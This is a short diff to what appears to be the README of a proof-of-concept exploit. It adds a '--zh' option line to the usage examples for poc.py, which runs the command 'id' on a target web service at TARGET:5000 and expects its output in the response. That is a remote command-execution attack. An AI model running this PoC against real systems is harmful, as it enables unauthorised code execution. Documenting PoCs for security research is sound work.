@@ -80,6 +80,7 @@ Expected body contains `MEMO-PING` plus the output of `id`. Reproducible CLI in 
 
 ```text
 python poc.py -u http://TARGET:5000 -c id
+python poc.py -u http://TARGET:5000 -c id --zh
 python poc.py -u http://TARGET:5000 -c id --proxy http://127.0.0.1:8080
 ```
 
